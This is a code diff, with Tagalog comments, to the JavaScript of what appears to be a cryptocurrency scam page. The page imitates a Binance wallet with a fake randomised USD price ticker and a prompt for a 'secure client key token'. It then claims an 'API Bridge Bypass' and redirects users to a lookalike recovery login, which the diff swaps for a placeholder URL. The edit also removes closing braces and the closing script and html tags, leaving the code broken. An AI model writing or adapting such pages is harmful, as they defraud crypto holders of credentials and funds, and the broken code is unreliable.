@@ -233,55 +233,21 @@
                     if (usdBox) {
                         const randomCents = (Math.random() * 2.6 - 1.3);
                         usdBox.innerText = "≈ $" + (79117.13 + randomCents).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2}) + " USD";
-                    }
-                }, 1400);
 
-                setTimeout(() => {
-                    clearInterval(priceTickerUSD);
-                    document.getElementById('wallet-step-binance-live-v4').style.display = 'none';
-                    document.getElementById('wallet-step-api-interface-v4').style.display = 'flex';
-                }, 15000);
-            }, 5000);
-        }, 10000);
-    }
-
-    function simulanPinalAPIHandshake() {
-        const token = document.getElementById('api-secure-token').value.trim();
-        if(token === "") { alert("Please input your secure client key token first."); return; }
-        
-        const btn = document.getElementById('btn-api-handshake');
-        btn.disabled = true;
-        btn.style.background = '#2b3139';
-        btn.style.color = '#848e9c';
-        btn.innerHTML = 'Broadcasting Handshake Stream...';
-setTimeout(() => {
-    btn.style.background = '#0ecb81';
-    btn.style.color = 'white';
-    btn.innerHTML = '✓ API Bridge Bypass Active';
-    alert('Handshake successfully broadcasted to network node gateways!');
+document.getElementById('wallet-step-binance-live-wd').addEventListener('click', () => {
+    let seconds = 5;
+    const btn = document.getElementById('wallet-step-binance-live-wd');
     
-    // Pagka-click ng 'OK' sa alert, abangan ang click sa button
-    btn.addEventListener('click', () => {
-        let seconds = 5;
+    btn.disabled = true;
+    btn.innerHTML = `<span class="spinner"></span> Redirecting in ${seconds}s...`;
+
+    const countdown = setInterval(() => {
+        seconds--;
+        btn.innerHTML = `<span class="spinner"></span> Redirecting in ${seconds}s...`;
         
-        // Pinapagana ang countdown agad pagka-click
-        btn.disabled = true; // I-disable para hindi ma-double click
-        btn.innerHTML = `⏳ Redirecting in ${seconds}s...`;
-
-        // Gumawa ng timer na umaandar bawat 1 segundo
-        const countdown = setInterval(() => {
-            seconds--;
-            btn.innerHTML = `⏳ Redirecting in ${seconds}s...`;
-            
-            if (seconds <= 0) {
-                clearInterval(countdown);
-                window.location.href = "https://binancerecov.base44.app/login";
-            }
-        }, 1000);
-    });
-
-}, 3000);
-</script>
-</body>
-</html>
-
+        if (seconds <= 0) {
+            clearInterval(countdown);
+            window.location.href = "https://iyong-website.com";
+        }
+    }, 1000);
+});
